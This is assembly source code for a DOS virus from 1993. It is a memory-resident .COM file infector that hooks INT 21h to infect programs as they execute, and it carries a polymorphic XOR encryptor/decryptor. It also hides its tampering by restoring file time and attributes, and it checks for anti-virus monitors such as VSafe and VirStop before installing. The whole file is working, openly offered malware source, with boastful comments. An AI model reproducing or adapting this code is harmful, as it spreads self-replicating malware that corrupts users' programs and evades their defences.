ORG 0100H                   ; ..
Virii label Near            ; Start adress CS:0100H
                            ;
Mutate Proc Near            ; The Decryption/encryption code begin here ..
Cmp  Ax,01100H              ;
J_N_E:                      ; Adress of the byte to change
JA   ByeBye                 ; Will change for an 'JNE'
ExitFromINT21:              ;
TTT:                        ;
ThePush:                    ;
Push Si                     ;
TheMov:                     ;
Lea  Si,TheBody             ;
Work:                       ;
theXor:                     ;
DB   02EH,081H,034H         ; XOR W[Cs:Bx], ..
Mask Dw 0                   ; Decryption/Encryption Key 
TheAdd:                     ;
Add  Si,2;                  ;
TheCmp:                     ;
Cmp  Si,ViriiEnd-3          ;
Jb   Thexor                 ;
ThePop:                     ;
Pop  Si                     ;
;                           ;
Cmp  B[Cs:FromTheHandler],1 ; The handler is calling?
Jne  TheBody                ; No
                            ;
ExitWithREt:                ;
Mov B[Cs:FromTheHandler],0  ;
PopA                        ;
ByeBye:                     ;
DB   0EAH                   ; Jmp Far
OLDINT21  DD 0              ;
;                           ;
FromTheHandler DB 0         ; Set to 1 if INT 21h handler call
;                           ;
Mutate EndP                 ; End of the procedure

TheBody Proc Near           ; This Part is encrypted With the key "Mask"
PushA                       ; 286 & +
Call ChangeDecryptor        ;
Cmp  B[Cs:InTSR],1          ; Is it an INT 21h Call ?
Jne  installit              ; 
Jmp  Near INT21handler      ; Yes .. jump to the handler
installit:                  ; Virus installation is done here
Mov  B[inTSR],1             ; Indicate that the virus is in service
Mov  B[J_N_E],072H          ; 'JNE'
;;;;;;;;
Mov  Ax,Cs                  ; ----- Reserve memory Block
Dec  Ax                     ; Point to the MCB
Mov  Ds,Ax                  ;         
Mov  Cx,W[Ds:3]             ; Read the Size of the memory block
Sub  Cx,VirSize2 + 20       ; Memory occuped by the Virus
Mov  Bx,Cx                  ;
Mov  Ah,04Ah                ;
int  021H                   ;
Mov  Bx,-1                  ;
Mov  Ah,048H                ;
Int  021H                   ;
Mov  Ah,048H                ;
Int  021H                   ;
Dec  Ax                     ;
Mov  Ds,Ax                  ;
Mov  W[1],0008              ; Set it as DOS SYSTEM AREA (heheheh)..
;;;;;;;;;;                  ;
Inc  Ax                     ;
Mov  Es,Ax                  ; Destination Seg:Off
Mov  Di,0100H               ; ES:DI ==> destination
Push Cs                     ; Source Seg:Off
Pop  Ds                     ; Set Ds to the current segment
Lea  SI,virii               ; DS:SI ==> source
Mov  Cx,VirLength           ; 
Cld                         ;
Repz                        ; 
Movsb                       ; 
Mov  W[Es:Mask],0           ;
;;;;;;;;;                   ;
Cli                         ;
Mov  Ds,Cx                  ; Ds to 0
Mov  Ax,W[Ds:084H]          ; Offset of the handler
Mov  W[Es:Oldint21],AX      ;
Mov  Bx,W[Ds:086H]          ; Segment of the Handler
Mov  W[Es:OldInt21+2],Bx    ;
Sti                         ;
Push Es                     ;
Push Di                     ;
Push Si                     ;
Call MemoryVerifier         ;
Pop  Si                     ;
Pop  Di                     ;
Pop  Es                     ;
Jc   AnotherDayMaybe        ;
;;;;;;;;;                   ; 
                            ;
Cli                         ;
Mov  W[0413H],Ax            ; Set Int 21 handler
Mov  Ax,0100H               ;
Mov  W[0084H],Ax            ;
Mov  Ax,Es                  ;
Mov  W[0086h],Ax            ;
Sti                         ;
Jmp  Ok                     ;
;;;;;;;;;;;;;;;             ; The handler is now installed
                            ; We have to Jump Far Far ..
AnotherDayMaybe:
Mov  Ah,049H                            
Int  021H
Ok:
                            ; And Encrypt It with a new Key
                            ; Jump To The virus In mem
Push Cs                     ; Save CS twice for later Uses  
Push Cs                     ; Do not forget : CS represents the segment
                            ; Of the previously infected application ! 
                            ;
Push Es                     ;
Push JumpTHere              ; Store offset and segment on the Stack
RetF                        ; & jump

                            
;---- This part run in "memory"
JumpTHere:                  ; 
DecryptEndOfFile:           ; Decrypt original application code
Pop  ES                     ; ES & DS set to the PSP segment
Pop  Ds                     ;
Mov  Di,Cs:[FileSize]       ; Destination
Add  Di,0100H               ; PSP Size (256 bytes) 
Mov  Si,Di                  ; Source
Push Si                     ;
;Mov  Cx,VirLength          ;
;Mov  Dl,B[Cs:LocalKey]     ; Local File Decryption Key
;Here2:                     ;
;LodsB                      ;
;Xor  Al,Dl                 ;
;StosB                      ;
;Loop Here2                 ; Decrypt the File
                            ;
CopyEndOfFile:              ; Now Copy The original code 
Mov  Cx,VirLength           ;
Pop  Si                     ;
Mov  Di,0100H               ; To the begining
Cld                         ;
Repz Movsb                  ; & Blit
                            ; The Job of the virus launcher is finished
                            ; We can now execute the infected file ..
;RESTORE  REGISTERS
Mov  W[Cs:Mask],0            ; we are not encrypted in the moment
PopA
Push es
Push 0100H
RetF


;******************************   ษออออออออออออออออออออออออออออออออออออออออป
;******************************   บ Features:                              บ
;**    Decryptor  Mutator    **   บ   1 .3 different encryptor/decryptor   บ
;**      By        X         **   บ   2 .Automatic size checking           บ
;**         15-3-93          **   บ   3 .Expansion possibilities           บ
;******************************   บ   4 .The smollest code                 บ
;******************************   ศออออออออออออออออออออออออออออออออออออออออผ
ChangeDecryptor Proc Near
Push Ax
Push Bx
Mov  Al,5
Mov  Bl,B[Cs:ThePush]
Cmp  Bl,053h
Je   BxIsTheRegister
Cmp  Bl,057H  
Jne  SiIsTheregister
Mov  Al,4
Jmp  MutateTheCode3
SiIsTheRegister:
Mov  Al,1
BxIsTheRegister:
MutateTheCode3:
Xor  B[Cs:ThePush],Al       ; Switch To SI register
Xor  B[Cs:ThePop],Al        ;  //
Xor  B[Cs:TheMov],Al        ; 
Xor  B[Cs:TheAdd+1],Al      ;
Xor  B[Cs:TheCmp+1],Al      ;       
Cmp  Al,1                   ;
Je   MutationDone           ;
Sub  Al,2                   ;
MutationDone:               ;
Xor  B[Cs:TheXor+2],Al      ;
Pop  Bx                    
Pop  Ax                    
RET                        
                           
;FVBM proc near              ; First five bytes mutator
;PushA                     
;Lea  Si,CodeTable           ; Offset of our table
;Push Cs                     ;
;Push Cs                     ;
;Pop  Ds                     ;
;Pop  Es                     ;
;Add  Si,B[Cs:pointer]       ; 
;Mov  Cx,0005                ; Copy 5 bytes
;Cld                         ;
;RepZ MovSB                  ; Blit
;Add  B[Cs:pointer],5        ;
;Cmp  B[Cs:pointer],25       ; are we at the end of the table
;Jne  Allright1              ;
;Mov  B[Cs:pointer],0        ;
;Allright1:                  ;
;Mov  Ax,02CH                ; Input from the timer
;int  021H                   ;
;Xor  Dh,Dl                  ;
;Mov  B[Cs:Mutate+1],Ch      ;
;Xor  Dl,Cl                  ;
;Mov  B[Cs:Mutate+3],Dl      ;
;PopA                        ;
;Ret                         ; return to the caller
;CodeTable:                  ;
One1 :    Mov  Ah,0          ; 
;;          Sub  Al,0        ;         
;          Nop               ;
;                            ;
;Two2 :    mov  Ch,0         ;
;          add  Bl,0         ;
;          Cld               ;
;                            ;
;Three3:   adc  Cl,0         ;
;          sub  Ch,0         ;
;          Stc               ;
;
;Four4 :   Mov  Bh,0
;          Mov  Cl,0
;          Nop
;
;CodeTableEnd:
;Pointer Db 0               ;
                            ;
                            ;
;******************************
;******************************
;**       Resident part      **
;**       By       X         **
;******************************
;******************************
HideINT21H Proc Near        ;
PopA                        ;
Mov  Bx,W[Cs:OLDint21]      ;
Mov  Es,Bx                  ;
Mov  Bx,W[Cs:Oldint21+2]    ;
Iret                        ;
                            ;
INT21Handler proc           ;
Cmp  Ax,04B00H              ;
Je   Exec                   ;
;Cmp  Ax,03521H              ;
;Jne  NoHide                 ;
;Call HideINT21H             ;
;NoHide:                     ;
;Cmp  Ax,02521H              ;
;Jne  Nothinginterresting    ;
;Call SimulateINT21H         ;
Nothinginterresting:        ;
Mov  B[Cs:FromTheHandler],1 ;
Jmp  ExitFromINT21          ;
Read:                       ;
Exec:                       ;

Mov  Ax,03D02H              ;
Int  021H                   ;
Jnc  OpenSuccess            ; Good ..
Jmp  OpenFailed             ; This operation  Failed ..
OpenSuccess:                ;
Mov  W[Cs:Handle],Ax        ;
Mov  Si,Dx                  ; VeriFy if the file has a .COM extension
HereX:                      ;
Lodsb                       ;
Cmp  al,'.'                 ; Searh for the Dot
Jne  HereX                  ;
Dec  Si                     ;
Dec  Si                     ;
Dec  Si                     ;
LodsW                       ;
Or   Ax,02020H              ;
Cmp  Ax,'dn'                ; Test For command.com
Jne  NotCommand             ;
Jmp  ExitSimple             ;
NotCommand:                 ;
Lodsb                       ;
Lodsb                       ;
Or  Al,20H                  ; .
Cmp Al,'c'                  ; C
Je  ContinueX               ;  
Jmp ExitSimple              ;
ContinueX:                  ;
LodsW                       ;  
Or  Ax,02020H               ; O
Cmp Ax,'mo'                 ; M
Je  ComType                 ; 
Jmp ExitSimple              ;
ComType:                    ; Now for Command.COM
;;;;;;;;;                   ;
Push Ds                     ;
Push Dx                     ;
Mov  Al,2                   ; To the end
Call Seek0                  ; 
Pop  Dx                     ;
Pop  Ds                     ;
;;;;;;;;;                   ;
Push Ax                     ;
Push Cx                     ;
Push Dx                     ;
Mov  Ah,02CH                ;
Int  021H                   ;
Mov  Cx,Ax                  ;
Xor  Cx,Dx                  ;
Mov  W[Cs:Mask],Cx          ; Use file size as mutation key
Pop  Dx                     ;
Pop  Cx                     ;
Pop  Ax                     ;
Mov  W[Cs:FileSize],Ax      ; Save File Size for the Mutation heritant
Cmp  Ax,Virlength           ; The file is too small?
Jnb  NotSmall               ;
Jmp  ExitSimple             ; Nop !
NotSmall:                   ;
Cmp  Ax,64000               ; The file is too big?
Jna  NotBig                 ;
Jmp  ExitSimple             ; No No
NotBig:
;;;;;;;;;
Mov  Ax,04300H              ;
Int  021H                   ;
Mov  W[Cs:OldAttr],Cx       ; Okey .. we have all we need
;;;;;;;;;
Mov  Bx,W[Cs:Handle]
Mov  Ax,04301H
Xor  Cx,Cx
Int  021H
;;;;;;;;;
Push Ds                     ; Save For later uses (attributes)
Push Dx                     ;
;;;;;;;;;
Mov  Ax,05700H              ;
Int  021H                   ;
Mov  W[Cs:OldTime],Cx       ; Save File Time
Mov  W[Cs:OldDate],Dx       ; Save File date
And  Cx,01FH                ; Several viruses use this indicator (second=62)    
Cmp  Cx,01FH                ;
Jne  NotInfected
Jmp  CloseAndExit           ; Infected .. leave it alone .
NotInfected:
;;;;;;;;;                   ;
Xor  Ax,Ax                  ; Seek to the Begining of the file (AL=0)
Call Seek0                  ;
;;;;;;;;;                   ;
InfectTheFile:              ; I love this part !
Mov  Bx,W[Cs:Handle]        ;
Mov  Ah,03FH                ; Read The Top of the File
Push Cs                     ;
Pop  Ds                     ; To The buffer ..
Lea  Dx,ViriiEnd            ; The buffer is located at the end of the virus
Mov  Cx,Virlength           ; Number of bytes to read
Int  021H                   ; (ViriiEnd = virlength+0100h)
Jnc  Continue6              ;
Jmp  CloseAndExit           ; Something is going wrong
Continue6:                  ;
;;;;;;;;;                   ;
Mov  Al,2                   ; Seek To the end
Call Seek0                  ;
;;;;;;;;;                   ; Encrypt the Code 
Mov  Bx,W[Cs:Mask]          ; get the virus Mask
Mov  Ah,02CH                ; Get a random Value
Int  021H                   ; From the timer
Xor  Bx,Dx                  ; Good Good ...
Mov  B[Cs:LocalKey],Bl      ; Use This as The original code encryptor
Mov  Dl,Bl
;;;;;;;;;                   ;
;Mov  Cx,Virlength           ; Encrypte the original code to make it harder 
;Lea  Bx,ViriiEnd            ; to detect by virus scanners.
;Here4:                      ;
;Xor  B[Cs:Bx],Dl            ;
;Inc  Bx                     ;
;Loop Here4                  ;
;;;;;;;;;                   ;
Lea  Dx,ViriiEnd            ;
Push Cs                     ;
Pop  Ds                     ;
Mov  Bx,W[Cs:Handle]        ;
Mov  Cx,Virlength           ;
Mov  Ah,040H                ; Write the code to the end
Int  021H                   ;
Jc   CloseAndExit           ; Bad ..
;;;;;;;;;                   ;
Xor  Ax,Ax                  ;
Call Seek0                  ; Seek to the begining of the file
;;;;;;;;;                   ; Copy The viral code to the peace of code
                            ; we read
Mov  B[Cs:J_N_E],077H       ;
Mov  B[Cs:InTSR],0          ;
Push Cs                     ;
Push Cs                     ;
Pop  Ds                     ;
Pop  Es                     ;
Lea  Si,Mutate              ; First We Blit The Mutation Engine
Lea  Di,ViriiEnd            ;
Mov  Cx,MutatorSize         ;
Cld
Repz MovsB                  ;
Mov  Cx,BodySize2           ; And blit the body after some mutations
Mov  Bx,W[Cs:Mask]          ; Mouahahahah ...
Here5:                      ;
LodsW                       ;
Xor  Ax,Bx                  ;
StosW                       ;
Loop Here5                  ;
;;;;;;;;;                   ;
Mov  B[Cs:J_N_E],072H       ;
Mov  B[Cs:InTSR],1          ; And restore the TSR Flag
Push Cs                     ;
Pop  Ds                     ;
Mov  Dx,offset ViriiEnd     ;
Mov  Bx,W[Cs:Handle]        ;
Mov  Cx,Virlength           ;
Mov  Ah,040H                ; Write The Virus
Int  021H                   ;
;                           ;
CloseAndExit:               ;
Mov  Bx,W[Cs:Handle]        ;
Mov  Ax,05701H              ;
Mov  Cx,W[Cs:OldTime]       ; Set File Time
Mov  Dx,W[Cs:OldDate]       ; Set File date
Int  021H                   ;
                            ;
Pop  Dx                     ;
Pop  Ds                     ;
Mov  Ax,04301H              ;
Mov  Cx,W[Cs:OldAttr]       ; Okey .. we have all we need
Int  021H                   ;
ExitSimple:                 ;
Mov  Bx,W[Cs:Handle]        ;
Mov  Ah,03EH                ; Close The File
Int  021H                   ;
OpenFailed:                 ;
Mov  B[Cs:FromTheHandler],1 ; This is the handler
Jmp  ExitFromInt21          ; Give me another monstreous mutation !
                            ;
Seek0:                      ;
Xor  Cx,Cx                  ;
Seek:                       ;
Mov  Ah,042H                ; Seek to the end or to the begining of the file
Xor  Dx,Dx                  ; Xor Dx,dx
Mov  Bx,W[CS:Handle]        ;
Int  021H                   ;
Ret                         ;

;******************************
;******************************
;**      Memory Verifier     **
;**       By       X         **
;**        18-03-1993        **
;******************************
;******************************
MemoryVerifier Proc Near
Stc                         ; Set the carry Flag
Cmp  Ax,0100H               ; The Virus is installed At ????H:0100H
Je   NoWay                  ; Do not take the risk
Cmp  Ax,0362H               ; VirStop is installed (Fprot) ..nonono
Je   NoWay                  ;
;
Mov  Ax,0FA00H              ; Test for vsafe (Central Point) ..nonono 
Xor  Di,Di                  ;
Mov  Dx,05945H              ;
Int  013H                   ;
Cmp  Di,04559H              ; 
Je   NoWay                  ;
;
Mov  Ax,0FF0FH              ; 
Int  021H                   ; VirexPc/Flushot INSTALLATION CHECK
Cmp  Ax,101H                ;
Je   NoWay                  ; Never , never , never !
;
Mov  Ax,04B4DH              ; Murphy 2 INSTALLATION CHECK
Int  021H
jnc  NoWay                  ; Nah !
;
Mov  Ax,04B59H              ; Murphy 1 INSTALLATION CHECK
Int  021H                   ;
Jnc  NoWay                  ; Murphy 1 is resident
;
Mov  Ax,04BFFH              ; CASCADE,Justice & 707 INSTALLATION CHECK
Xor  Si,Si                  ; Si&Di to zero for CASCADE
Xor  Di,Di                  ;
Int  021H
Cmp  Bl,0FFH
Je   NoWay                  ; 707 is resident
;
Cmp  Di,055AAH        
Je   NoWay                  ; Cascade or justice is resident
;
Mov  Ax,0357FH              ; AgiPlan INSTALLATION CHECK
Int  021H
Cmp  Dx,0FFFFH              ; 
Je   NoWay                  ; AgiPlan is installed
;
Mov  Ax,04243H              ; Invader INSATLLATION CHACK
Int  021H
Cmp  Ax,05678H              
Je   NoWay                  ; Invader is resident
;
Clc                         ; Okey .. 
Jmp  return
Noway:
Stc
return:
Ret
MemoryVerifier EndP

DatasArea:                  ; For Datas storage.
SizeOfTheHole DW 0
FileSize   DW FileLength     ; The size of the infected File
inTSR      DB 0
LocalKey   DB 0
Victim_Releated_Datas:
Handle     DW 0
OldAttr    DW 0
OldTime    DW 0
OldDate    DW 0
ViriiEnd:
;Constante
VirLength   EQU (ViriiEnd-Virii)
VirSize2    EQU (Virlength/16) * 2
VirSize4    EQU VirSize2 * 2
VirLength2  EQU Virlength/2
MutatorSize EQU TheBody-Mutate
BodySize    EQU ViriiEnd-TheBody

BoDySize2   EQU BoDySize/2

TheCenter:
Db 300 dup (0)

TheCodePart:
Db (Virlength-5)  dup (90h)
Mov Ax,04C00h
Int 021H
EndOfFile:
FileLength equ  TheCodePart-virii

